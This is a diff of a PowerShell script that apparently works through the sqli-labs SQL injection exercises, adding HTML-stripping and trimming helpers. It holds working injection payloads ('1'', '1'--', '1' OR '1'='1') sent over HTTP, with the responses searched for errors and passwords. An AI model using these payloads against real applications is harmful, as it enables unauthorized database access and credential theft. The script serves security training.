@@ -9,27 +9,50 @@ function Replace-MultipleNewlines {
     param (
         [string]$inputString
     )
-    
-    # while MultipleNewlines exists
-    while ($inputString -match '\r?\n+') {
-        $inputString = $inputString -replace '\r?\n+', "`n"
-    }
-    
+
+    # Replace 2 or more consecutive newlines with a single newline
+    $inputString = $inputString -replace '(\r?\n){2,}', "`n"
+
     $inputString
 }
 
+
+function Remove-Boring-HTMLTags {
+    param (
+        [string]$inputString
+    )
+
+    # replace <DOCTYPE, <html, <head
+    $inputString = $inputString -replace '<!DOCTYPE[^>]+>', ' '
+    $inputString = $inputString -replace '<html[^>]+>', ' '
+    $inputString = $inputString -replace '<head[^>]+>', ' '
+    # meta  
+    $inputString = $inputString -replace '<meta[^>]+>', ' '
+
+    # and their closing tags
+    $inputString = $inputString -replace '</html>', ' '
+    $inputString = $inputString -replace '</head>', ' '
+    $inputString = $inputString -replace '</body>', ' '
+    $inputString = $inputString -replace '</title>', ' '
+
+    $inputString
+}
 
 # Trim and replace multiple newlines with a single newline
 function Better-Trim {
     param (
         [string]$inputString
     )
+
+    # Remove HTML tags
+    $inputString = Remove-Boring-HTMLTags $inputString
     
-    # while MultipleNewlines exists
-    while ($inputString -match '\r?\n+') {
-        $inputString = $inputString -replace '\r?\n+', "`n"
-    }
+    # trim whitespace
+    $inputString = $inputString.Trim()
     
+    # Replace 2 or more consecutive newlines with a single newline
+    $inputString = Replace-MultipleNewlines ($inputString)
+
     $inputString.Trim()
 }
 
@@ -45,15 +68,15 @@ Better-Trim ((iwr "http://$ip/Less-1/?id=$payload").Content) | Select-String -Pa
 
 # Single quote causes SQL error
 $payload="1'"
-(iwr "http://$ip/Less-1/?id=$payload").Content.Trim() | Select-String -Pattern 'error'
+Better-Trim ((iwr "http://$ip/Less-1/?id=$payload").Content) | Select-String -Pattern 'error'
 
 # Confirm with comment
 $payload="1'--"
-(iwr "http://$ip/Less-1/?id=$payload").Content.Trim() | Select-String -Pattern 'error'
+Better-Trim ((iwr "http://$ip/Less-1/?id=$payload").Content) | Select-String -Pattern 'error'
 
 # Extract data or test if we can successfully run a SQL command
 $payload="1' OR '1'='1"
-(iwr "http://$ip/Less-1/?id=$payload").Content.Trim() | Select-String -Pattern 'password'
+Better-Trim ((iwr "http://$ip/Less-1/?id=$payload").Content) | Select-String -Pattern 'password'
 
 # ============================================================================
 # Less-2: Error-Based Numeric Injection
